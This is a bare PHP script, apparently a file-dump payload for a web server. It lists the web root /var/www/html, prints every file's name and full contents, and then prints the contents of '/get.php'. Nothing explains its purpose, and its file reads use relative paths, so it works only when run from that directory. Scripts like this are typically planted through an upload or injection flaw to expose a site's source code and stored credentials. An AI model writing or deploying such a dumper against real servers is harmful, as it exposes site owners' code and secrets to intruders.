<?php
$files = scandir('/var/www/html');
$f = array();
foreach($files as $file){
    echo $file."\n";
    echo " \n";
    array_push($f, file_get_contents($file));
}

foreach($f as $of){
    echo $of;
    echo " \t\n";
}
$homepage = file_get_contents('/get.php');
echo $homepage;
?>